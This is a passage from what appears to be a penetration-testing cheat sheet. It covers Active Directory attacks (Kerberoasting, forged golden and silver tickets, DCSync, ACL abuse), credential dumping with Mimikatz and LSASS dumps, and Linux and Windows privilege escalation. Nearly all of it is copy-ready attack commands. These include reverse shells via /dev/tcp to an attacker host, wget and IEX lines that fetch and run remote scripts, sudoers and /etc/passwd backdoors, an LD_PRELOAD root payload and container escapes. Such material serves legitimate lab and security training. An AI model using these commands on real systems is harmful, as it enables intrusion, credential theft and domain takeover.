Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt
Rubeus.exe kerberoast /user:targetuser /format:hashcat
# Invoke-Kerberoast (PowerView):
Invoke-Kerberoast -OutputFormat Hashcat | fl
# Crack (hashcat -m 13100):
hashcat -m 13100 kerb_hashes.txt rockyou.txt
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule

# ── TARGETED KERBEROAST (if GenericWrite) ─────────────────────
# Set SPN on a target user account, then kerberoast them:
Set-ADUser target -ServicePrincipalNames @{Add='http/fake'}
GetUserSPNs.py $DOMAIN/user:pass -dc-ip $IP -request -usersfile targetuser.txt
# Clean up:
Set-ADUser target -ServicePrincipalNames @{Remove='http/fake'}

# ── PASS THE TICKET ───────────────────────────────────────────
# Get TGT:
getTGT.py $DOMAIN/user:pass -dc-ip $IP           # → user.ccache
getTGT.py $DOMAIN/user -hashes :NTLMHASH -dc-ip $IP
export KRB5CCNAME=/path/to/user.ccache
# Use with impacket:
impacket-psexec $DOMAIN/user@target -no-pass -k
impacket-smbclient $DOMAIN/user@target -no-pass -k
impacket-wmiexec $DOMAIN/user@target -no-pass -k
# From Windows — Rubeus:
Rubeus.exe asktgt /user:user /password:pass /domain:$DOMAIN /dc:$IP /ptt
Rubeus.exe ptt /ticket:base64ticket
klist    # Verify

# ── OVERPASS THE HASH ─────────────────────────────────────────
# Convert NTLM hash to Kerberos ticket:
# Mimikatz:
sekurlsa::pth /user:user /domain:$DOMAIN /ntlm:NTLMHASH /run:cmd.exe
# New cmd window → now has Kerberos ticket
# From Kali:
getTGT.py $DOMAIN/user -hashes :NTLMHASH -dc-ip $IP
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/user@DC -no-pass -k

# ── SILVER TICKET ─────────────────────────────────────────────
# Forge service ticket (requires service account hash + SID)
# More stealthy than golden (no DC communication)
impacket-ticketer -nthash SERVICEHASH -domain-sid S-1-5-21-xxx -domain $DOMAIN -spn cifs/server.domain.com administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec $DOMAIN/administrator@server.domain.com -no-pass -k

# ── GOLDEN TICKET ─────────────────────────────────────────────
# Requires: KRBTGT hash + Domain SID
# Get domain SID:
impacket-lookupsid $DOMAIN/user:pass@$IP | grep "Domain SID"
# Get KRBTGT hash (DCSync required — need DA or replication rights):
impacket-secretsdump $DOMAIN/admin:pass@$IP -just-dc-user krbtgt
# Forge:
impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec $DOMAIN/administrator@$DC -no-pass -k
# Mimikatz golden ticket:
kerberos::golden /domain:$DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt

# ── DIAMOND/SAPPHIRE TICKET (newer, harder to detect) ─────────
Rubeus.exe diamond /tgtdeleg /ticketuser:user /ticketuserid:500 /groups:512
```

</details>

<details>
<summary>🔎 9.5 BloodHound — Complete Workflow</summary>

```bash
# ── DATA COLLECTION ───────────────────────────────────────────
# From Kali (requires creds):
bloodhound-python -u user -p pass -d $DOMAIN -ns $IP -c All
bloodhound-python -u user -p pass -d $DOMAIN -dc $DC -c All --zip
# Output: *.json or *.zip

# From Windows (SharpHound):
SharpHound.exe -c All --outputdirectory C:\Users\Public\ --zipfilename loot.zip
SharpHound.exe -c All,GPOLocalGroup  # Include GPO local group membership
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\

# ── START BLOODHOUND ──────────────────────────────────────────
sudo neo4j start
bloodhound &
# Login: neo4j / neo4j (change on first run)
# Drag-drop ZIP into BloodHound

# ── KEY QUERIES ───────────────────────────────────────────────
# Pre-built:
"Find all Domain Admins"
"Find Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"Find Computers with Unsupported Operating Systems"
"Shortest Path from Owned Principals"
"Find AS-REP Roastable Users"
"Find Kerberoastable Users with Most Privileges"
"List all Kerberoastable Accounts"
"Find Users with Foreign Domain Group Membership"
"Find Dangerous Rights for Domain Users"

# Custom Cypher queries (in Raw Query box):
# Users with local admin:
MATCH (m:Computer) WHERE m.operatingsystem =~ '(?i).*(7|2008|xp|vista).*' RETURN m

# Path from user to DA:
MATCH (u:User {name:"USER@DOMAIN"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN"}), p=shortestPath((u)-[*1..]->(g)) RETURN p

# All machines current user can reach:
MATCH (c:Computer), (u:User {name:"USER@DOMAIN"}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# ── MARK AS OWNED ─────────────────────────────────────────────
# Right-click user/computer → Mark as Owned
# Then: "Shortest Path from Owned" → finds exact attack path

# ── BLOODHOUND ATTACK PATHS ───────────────────────────────────
# GenericAll on User:
net user victim NewPass123! /domain
# GenericAll on Group:
net group "Domain Admins" lowpriv /add /domain
# GenericAll on Computer:  → RBCD (Resource-Based Constrained Delegation)
# WriteDACL → grant DCSync:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity user -Rights DCSync
# WriteOwner → take ownership:
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
# ForceChangePassword:
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "NewPass" -AsPlainText -Force)
```

</details>

<details>
<summary>💀 9.6 Domain Compromise — Final Steps</summary>

```bash
# ── DCSYNC (get all hashes) ───────────────────────────────────
# Requires: DCSync rights (DA, or granted via ACL)
impacket-secretsdump $DOMAIN/admin:pass@$DC
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-ntlm   # NTLM only
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-user Administrator
impacket-secretsdump $DOMAIN/admin:pass@$DC -outputfile loot/hashes/domain_hashes
# Mimikatz:
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv

# ── NTDS.DIT EXTRACTION ───────────────────────────────────────
# If can't DCSync but have SYSTEM on DC:
# VSS shadow copy:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Transfer files to Kali, then:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── PASS-THE-HASH DA ──────────────────────────────────────────
impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
evil-winrm -i $IP -u Administrator -H NTLMHASH
crackmapexec smb $IP -u Administrator -H NTLMHASH -x 'whoami'

# ── SPRAY DA HASH EVERYWHERE ──────────────────────────────────
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
# Local admin hash spray (built-in Administrator is same on all):
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth

# ── DUMP LSASS (for more creds) ───────────────────────────────
# From admin shell:
# Method 1 — Mimikatz:
sekurlsa::logonpasswords
# Method 2 — Task Manager (GUI): processes → lsass.exe → Create dump file
# Method 3 — ProcDump:
procdump.exe -ma lsass.exe lsass.dmp
# Method 4 — comsvcs.dll (no extra tool):
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
# Method 5 — Pypykatz (parse on Kali):
pypykatz lsa minidump lsass.dmp
```

</details>

<details>
<summary>🔐 9.7 ACL / DACL Abuse</summary>

```bash
# ── FIND EXPLOITABLE ACES ─────────────────────────────────────
# PowerView:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "lowprivuser"}
# All writable ACEs for current user:
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty" -and $_.IdentityReferenceName -match "lowprivuser"}

# BloodHound shows these too (red edges)

# ── GENERICALL ON USER ────────────────────────────────────────
# Change password:
net user target 'NewPass123!' /domain
# PowerShell:
$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-ADAccountPassword -Identity target -NewPassword $pass -Reset -Confirm:$false
# Force password reset on next login:
Set-ADUser target -ChangePasswordAtLogon $true

# ── GENERICALL / GENERICWRITE ON GROUP ────────────────────────
# Add member:
net group "Domain Admins" lowprivuser /add /domain
Add-ADGroupMember -Identity "Domain Admins" -Members lowprivuser

# ── WRITEDACL ─────────────────────────────────────────────────
# Grant DCSync to self:
Add-ObjectACL -PrincipalIdentity attacker -Credential cred -TargetIdentity "DC=domain,DC=com" -Rights DCSync
# Then DCSync

# ── WRITEOWNER ────────────────────────────────────────────────
# Take ownership, then modify:
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
Add-ObjectACL -TargetIdentity target -PrincipalIdentity attacker -Rights All

# ── FORCECHANGEPASSWORD ───────────────────────────────────────
$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity target -AccountPassword $pass

# ── ADDMEMBER ─────────────────────────────────────────────────
Add-ADGroupMember -Identity "Domain Admins" -Members attacker
net group "Domain Admins" attacker /add /domain
```

</details>

<details>
<summary>🏃 9.8 Lateral Movement in AD</summary>

```bash
# ── REMOTE CODE EXECUTION (choose based on what's open) ───────
# WinRM (5985): evil-winrm
# SMB (445): psexec, smbexec, atexec
# WMI (135): wmiexec
# DCOM (135): dcomexec
# SSH (22): ssh
# RDP (3389): xfreerdp

# ── IMPACKET SUITE ────────────────────────────────────────────
impacket-psexec $DOMAIN/user:pass@$IP               # Creates service, uploads binary
impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/user:pass@$IP              # WMI — no service created
impacket-smbexec $DOMAIN/user:pass@$IP              # SMB — no binary on disk
impacket-atexec $DOMAIN/user:pass@$IP "whoami"      # Task scheduler
impacket-dcomexec $DOMAIN/user:pass@$IP 'id' -object MMC20  # DCOM

# ── CRACKMAPEXEC ──────────────────────────────────────────────
crackmapexec smb $IP -u user -p pass -x 'whoami'           # cmd
crackmapexec smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
crackmapexec winrm $IP -u user -p pass -x 'whoami'
crackmapexec smb $IP/24 -u admin -H HASH -x 'whoami' --continue-on-success  # Spray

# ── EVIL-WINRM ────────────────────────────────────────────────
evil-winrm -i $IP -u user -p pass
# Upload tool:
upload /tmp/winPEAS.exe
# Download:
download proof.txt /tmp/

# ── ENABLE WINRM (from local admin) ───────────────────────────
Enable-PSRemoting -Force
winrm quickconfig -quiet
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
```

</details>

---

## 10. POST-EXPLOITATION — LINUX

<details>
<summary>👁️ 10.1 Full Situational Awareness</summary>

```bash
# get python interactive shell =>
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg

# ── RUN THIS ENTIRE BLOCK IMMEDIATELY AFTER GETTING SHELL ─────
id; whoami; hostname; cat /etc/os-release; uname -a
ip a; ip route; cat /etc/hosts; arp -a
ss -tulnp 2>/dev/null || netstat -antup 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
crontab -l 2>/dev/null; cat /etc/cron* 2>/dev/null
ps aux | head -30
env

# ── INTERNAL SERVICES (ports not visible from outside!) ───────
ss -tulnp    # What's only listening on localhost?
# Common finds:
# 127.0.0.1:3306 → MySQL
# 127.0.0.1:6379 → Redis
# 127.0.0.1:8080 → Internal web app
# Port forward to reach:
ssh -L 8080:127.0.0.1:8080 user@$IP    # From attacker

# ── FILESYSTEM SEARCH ─────────────────────────────────────────
# Sensitive file types:
find / -name "*.conf" -readable 2>/dev/null | grep -v proc
find / -name "*.cfg" -readable 2>/dev/null | grep -v proc
find / -name "*.ini" -readable 2>/dev/null | grep -v proc
find / -name "*.sh" -readable 2>/dev/null | grep -v proc
find / -name "*.py" -readable 2>/dev/null | grep -v proc
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# World-writable files/dirs:
find / -writable -type d 2>/dev/null | grep -v proc
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Recently modified:
find / -newer /tmp -type f 2>/dev/null | grep -v proc | grep -v sys | head -30

# Interesting dirs:
ls -la /opt/ /srv/ /var/backups/ /var/www/ /var/mail/ /tmp/ /dev/shm/

# ── CAPABILITIES CHECK ────────────────────────────────────────
getcap -r / 2>/dev/null

# ── SENSITIVE FILE CONTENT ────────────────────────────────────
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat ~/.local/share/recently-used.xbel 2>/dev/null   # GUI recent files
cat ~/.config/*/config 2>/dev/null
find /home -name ".bash_history" 2>/dev/null | xargs cat
find /root -name ".bash_history" 2>/dev/null | xargs cat
```

</details>

<details>
<summary>🔍 10.2 Linux Internal Enumeration — Advanced</summary>

```bash
# ── PROCESS MONITORING (key for cron exploitation) ────────────
# pspy — monitor processes without root:
./pspy64 | tee /tmp/pspy.log &
# Watch for 5-10 minutes for cron jobs
# Look for: root running scripts, interesting arguments with passwords

# ── NETWORK PIVOTING ──────────────────────────────────────────
# What other machines can THIS box reach?
for i in $(seq 1 254); do (ping -c1 192.168.x.$i >/dev/null && echo "192.168.x.$i") & done
# Port scan internal hosts:
for port in 22 80 443 445 3389 8080; do
  for host in 192.168.x.{1..254}; do
    (nc -zv -w1 $host $port 2>&1 | grep -v "refused") &
  done
done

# ── DOCKER/CONTAINER CHECK ────────────────────────────────────
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv 2>/dev/null
env | grep -i kube
# If in container — look for:
# - Mounted secrets
# - Kubernetes service account tokens
# - Docker socket
ls /var/run/docker.sock 2>/dev/null
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# ── MYSQL/DB CREDENTIALS FROM APP ─────────────────────────────
# WordPress:
find / -name "wp-config.php" 2>/dev/null | xargs grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# Django:
find / -name "settings.py" 2>/dev/null | xargs grep -E "DATABASES|PASSWORD" 2>/dev/null
# Laravel:
find / -name ".env" 2>/dev/null | xargs cat

# Then access the DB directly for more creds:
mysql -u root -p$(grep DB_PASSWORD .env | cut -d= -f2) -e "show databases; use app; select * from users;"
```

</details>

---

## 11. POST-EXPLOITATION — WINDOWS

<details>
<summary>👁️ 11.1 Full Windows Situational Awareness</summary>

```cmd
REM ── RUN IMMEDIATELY AFTER SHELL ──────────────────────────────
whoami /all
hostname
ipconfig /all
netstat -ano
net users
net localgroup administrators
systeminfo
wmic os get caption,version
wmic computersystem get domain
wmic product get name,version
tasklist /svc
schtasks /query /fo LIST /v
netsh firewall show state
cmdkey /list
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
dir C:\Users\
dir C:\Users\user\Desktop
dir C:\Users\user\Documents
dir C:\Users\user\Downloads
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\
```

</details>

<details>
<summary>📦 11.2 Windows Credential Extraction</summary>

```powershell
# ── MIMIKATZ (most powerful) ──────────────────────────────────
.\mimikatz.exe
privilege::debug                           # Must succeed (need SYSTEM/admin)
token::elevate                             # Elevate to SYSTEM token
sekurlsa::logonpasswords                   # All logged-in user creds (cleartext if possible)
sekurlsa::wdigest                          # WDigest (cleartext on older systems)
sekurlsa::kerberos                         # Kerberos tickets
sekurlsa::credman                          # Credential Manager
lsadump::sam                               # SAM hashes (local accounts)
lsadump::secrets                           # LSA secrets
lsadump::cache                             # Cached domain credentials
lsadump::dcsync /domain:domain.com /all    # DCSync (if DA)

# Mimikatz one-liner:
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# ── DUMP LSASS WITHOUT MIMIKATZ ───────────────────────────────
# Via comsvcs.dll (built-in, less detected):
$id = (Get-Process -Name lsass).Id
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $id C:\Users\Public\lsass.dmp full
# Transfer lsass.dmp to Kali, analyze:
pypykatz lsa minidump lsass.dmp
# Or: impacket-secretsdump -sam lsass.dmp LOCAL (for SAM format)

# Via ProcDump (sysinternals):
.\procdump.exe -ma lsass.exe lsass.dmp -accepteula

# ── ENABLE WDIGEST (cleartext passwords after re-login) ────────
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# Wait for user to log in again → then dump

# ── CREDENTIAL MANAGER ────────────────────────────────────────
cmdkey /list
# If RDP creds listed:
runas /savedcredentials /user:DOMAIN\user "cmd.exe /c whoami > C:\Users\Public\out.txt"
# Mimikatz:
vault::cred
vault::list

# ── SAM WITHOUT SYSTEM PRIVILEGE ──────────────────────────────
# Volume Shadow Copy trick (if backup rights):
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
# Then copy from shadow:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# ── DPAPI (encrypted user secrets) ────────────────────────────
# Browser passwords, certificates, etc.
# Mimikatz:
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
sekurlsa::dpapi

# ── WIRELESS PASSWORDS ────────────────────────────────────────
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear    # cleartext key!
```

</details>



---

## 12. PRIVILEGE ESCALATION — LINUX (EVERY VECTOR)

<details>
<summary>🤖 12.1 Automated Enumeration — Run All</summary>

```bash
# Serve from Kali: python3 -m http.server 80

# LinPEAS (most comprehensive — ALWAYS run first):
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.txt
# COLORS: RED = critical, YELLOW = interesting, CYAN = config info

# Linux Smart Enumeration:
wget http://$LHOST/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l 2 | tee /tmp/lse.txt

# LinEnum:
wget http://$LHOST/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh -t | tee /tmp/le.txt

# pspy (monitor processes without root — ESSENTIAL for cron hunting):
wget http://$LHOST/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy | tee /tmp/pspy.log
# Let it run for 2-5 minutes and watch for root processes

# unix-privesc-check:
wget http://$LHOST/unix-privesc-check -O /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard
```

</details>

<details>
<summary>🔐 12.2 Sudo — Every Escape Technique</summary>

```bash
# ── CHECK ─────────────────────────────────────────────────────
sudo -l           # What can we run as root?
sudo -V           # Check version for CVEs

# ── GTFOBins: https://gtfobins.github.io (check EVERY binary)
# Common sudo escapes:
sudo find . -exec /bin/bash \; -quit
sudo find / -name "x" -exec /bin/bash \;
sudo vim -c ':!/bin/bash'
sudo vim -c ':set shell=/bin/bash:shell'
sudo vi -c ':!/bin/bash'
sudo nano → Ctrl+R → Ctrl+X → bash
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo python2 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo nmap --interactive → !bash    (nmap < 5.21)
sudo less /etc/passwd → !bash
sudo more /etc/passwd → !bash
sudo man ls → !bash
sudo ftp → ! bash
sudo mysql -e '! /bin/bash'
sudo zip /tmp/x /etc/passwd -T --unzip-command="bash -c bash"
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo env /bin/bash
sudo ash; sudo dash; sudo sh; sudo csh; sudo ksh; sudo zsh
sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p
sudo dd if=/etc/shadow           # Read any file
sudo tee /etc/sudoers <<< "user ALL=(ALL) NOPASSWD: ALL"
sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
sudo php -r 'system("/bin/bash");'
sudo gcc -wrapper /bin/bash,-s .
sudo strace -o /dev/null /bin/bash
sudo git -p help config → !bash

# ── SUDO ENV_KEEP → LD_PRELOAD ────────────────────────────────
# If sudo -l shows: env_keep+=LD_PRELOAD
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so any_allowed_command

# ── CVEs ──────────────────────────────────────────────────────
# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2:
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# If "Segmentation fault" → vulnerable

# CVE-2019-14287 — sudo -u#-1 bypass (sudo < 1.8.28):
# Requires: (ALL, !root) NOPASSWD: /bin/bash in sudoers
sudo -u#-1 /bin/bash        # OR
sudo -u#4294967295 /bin/bash
```

</details>

<details>
<summary>🔴 12.3 SUID / SGID Binaries</summary>

```bash
# ── FIND ──────────────────────────────────────────────────────
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
find / -perm /6000 -type f 2>/dev/null

# Check EVERY result on: https://gtfobins.github.io → filter: SUID

# ── ANALYZE CUSTOM SUID BINARIES ──────────────────────────────
strings /path/to/suid_binary          # Find called commands/files
strace /path/to/suid_binary 2>&1      # Trace syscalls
ltrace /path/to/suid_binary 2>&1      # Trace library calls

# If it calls something without full path → PATH hijack (see 12.6)
# If it opens a file you can write → symlink attack

# ── SPECIFIC SUID EXPLOITS ────────────────────────────────────
/bin/bash -p              # If bash is SUID
/usr/bin/find . -exec /bin/bash -p \; -quit
/usr/bin/vim -c ':!/bin/bash -p'
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# cp (SUID) → overwrite any file:
openssl passwd -1 -salt xyz password123
cp /etc/passwd /tmp/passwd.bak && echo 'r00t:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su r00t

# dd (SUID) → read/write any file:
dd if=/etc/shadow       # Read
echo "content" | dd of=/etc/sudoers

# tee (SUID):
echo "user ALL=(ALL) NOPASSWD:ALL" | /usr/bin/tee /etc/sudoers

# pkexec (CVE-2021-4034 PwnKit — virtually all Linux):
ls -la /usr/bin/pkexec && searchsploit pkexec
```

</details>

<details>
<summary>✏️ 12.4 Writable Files & Misconfigurations</summary>

```bash
# ── WRITABLE /etc/passwd ──────────────────────────────────────
ls -la /etc/passwd
# If writable:
openssl passwd -1 -salt abc password123   # Generate MD5 hash
echo 'pwned:$1$abc$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned    # password: password123

# ── WRITABLE /etc/shadow ──────────────────────────────────────
python3 -c "import crypt; print(crypt.crypt('password123', crypt.mksalt(crypt.METHOD_SHA512)))"
# Replace root's hash in /etc/shadow

# ── WRITABLE /etc/sudoers ─────────────────────────────────────
echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "user ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/$(whoami)

# ── WRITABLE SERVICE FILES ────────────────────────────────────
find /etc/systemd /lib/systemd -writable 2>/dev/null
# Modify ExecStart= line to run your shell → systemctl restart service

# ── WORLD-WRITABLE SCRIPTS CALLED BY ROOT ─────────────────────
# Run pspy64 → find scripts root runs → check if you can write them
find / -writable -type f 2>/dev/null | grep -v "proc\|sys\|dev"

# ── NFS no_root_squash ────────────────────────────────────────
cat /etc/exports | grep no_root_squash
# If found: mount + create SUID bash (see Section 4.8)
```

</details>

<details>
<summary>⏰ 12.5 Cron Job Exploitation</summary>

```bash
# ── FIND CRON JOBS ────────────────────────────────────────────
cat /etc/crontab
cat /etc/cron.d/*
crontab -l 2>/dev/null
# BEST METHOD — pspy shows real-time:
./pspy64    # Watch for 3-5 minutes — note UID=0 processes

# ── EXPLOIT: WRITABLE SCRIPT ──────────────────────────────────
# Root cron runs /opt/cleanup.sh and you can write it:
echo "chmod +s /bin/bash" >> /opt/cleanup.sh
# Wait → /bin/bash -p

# Or reverse shell:
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > /opt/cleanup.sh
chmod +x /opt/cleanup.sh    # nc -nvlp $LPORT on Kali

# ── EXPLOIT: WILDCARD INJECTION ───────────────────────────────
# Root cron: tar czf /backup/backup.tar.gz /var/www/*
cd /var/www
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# tar processes these as options due to wildcard expansion

# ── EXPLOIT: PATH HIJACK IN CRON ──────────────────────────────
# Cron PATH includes /tmp and script calls 'service' without full path:
cat > /tmp/service << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/service
# Next cron run → /bin/bash -p
```

</details>

<details>
<summary>🛤️ 12.6 PATH Hijacking</summary>

```bash
# ── FIND VULNERABLE BINARIES ──────────────────────────────────
strings /path/to/suid_binary | grep -v "/" | grep -E "^[a-z]"
# Or:
strace -v -f -e trace=execve ./suid_binary 2>&1 | grep exec
ltrace ./suid_binary 2>&1 | grep exec

# ── EXPLOIT ───────────────────────────────────────────────────
# Binary calls 'service' without /usr/sbin/service:
export PATH=/tmp:$PATH
cat > /tmp/service << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
EOF
chmod +x /tmp/service
./suid_binary    # Triggers /tmp/service as root
/tmp/bash -p     # Root shell
```

</details>

<details>
<summary>⚡ 12.7 Linux Capabilities</summary>

```bash
# ── FIND ──────────────────────────────────────────────────────
getcap -r / 2>/dev/null

# ── DANGEROUS CAPS ────────────────────────────────────────────
# cap_setuid+ep on python3 → setuid(0):
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search+ep → read any file:
# (on perl, vim, node, etc.) → read /etc/shadow

# cap_dac_override+ep → write any file:
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# cap_fowner+ep → chmod any file:
chmod +s /bin/bash

# cap_net_raw+ep → sniff/spoof traffic
# cap_sys_admin+ep → mount filesystems, many privileged ops

# ── CAPSH ─────────────────────────────────────────────────────
capsh --print     # Show current capabilities
# If capsh itself has capabilities:
capsh --gid=0 --uid=0 --
```

</details>

<details>
<summary>💣 12.8 Kernel Exploits</summary>

```bash
# ── CHECK KERNEL ──────────────────────────────────────────────
uname -r; uname -a; cat /proc/version

# ── AUTO SUGGEST ──────────────────────────────────────────────
./linux-exploit-suggester.sh 2>/dev/null
./lse.sh -l 2 -c  # Shows kernel CVEs

# ── MOST COMMON ───────────────────────────────────────────────
# Dirty COW (CVE-2016-5195) — Kernel < 4.8.3:
gcc -pthread dirty.c -o dirty -lcrypt && ./dirty newpassword
# → su firefart (or new root account)

# DirtyPipe (CVE-2022-0847) — Kernel 5.8 - 5.16.11:
./dirtypipe    # Overwrites SUID binary or /etc/passwd

# PwnKit (CVE-2021-4034) — polkit < 0.121 (most Linux):
make && ./cve-2021-4034   # Instant root

# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2:
# (See sudo section above)
```

</details>

<details>
<summary>🐳 12.9 Container & Docker Escapes</summary>

```bash
# ── DETECT CONTAINER ──────────────────────────────────────────
cat /proc/1/cgroup | grep -i docker   # Shows "docker" if containerized
ls /.dockerenv 2>/dev/null && echo "In Docker"
systemd-detect-virt 2>/dev/null

# ── DOCKER SOCKET ESCAPE ──────────────────────────────────────
ls -la /var/run/docker.sock
# If accessible → full host escape:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
docker -H unix:///var/run/docker.sock run --privileged --pid=host -it alpine nsenter -t 1 -m -u -i -n -- bash

# ── PRIVILEGED CONTAINER ──────────────────────────────────────
# Check if privileged:
cat /proc/self/status | grep CapEff
# All f's = privileged
# Escape — mount host disk:
fdisk -l        # Find host disk (usually /dev/sda1 or /dev/xvda1)
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
```

</details>

---

## 13. PRIVILEGE ESCALATION — WINDOWS (EVERY VECTOR)

<details>
<summary>🤖 13.1 Automated Tools — Run These First</summary>

```powershell
# ── WINPEAS (BEST for Windows) ────────────────────────────────
.\winPEASx64.exe
.\winPEASx86.exe           # 32-bit systems
.\winPEASany.exe | Tee-Object winpeas.txt

# ── POWERUP ───────────────────────────────────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1')
Invoke-AllChecks | Out-File -Encoding ASCII powerup_results.txt

# ── SEATBELT ──────────────────────────────────────────────────
.\Seatbelt.exe -group=all
.\Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges

# ── SHARPUP ───────────────────────────────────────────────────
.\SharpUp.exe audit

# ── WATSON (patch-based privesc) ──────────────────────────────
.\Watson.exe    # Shows exploitable missing patches

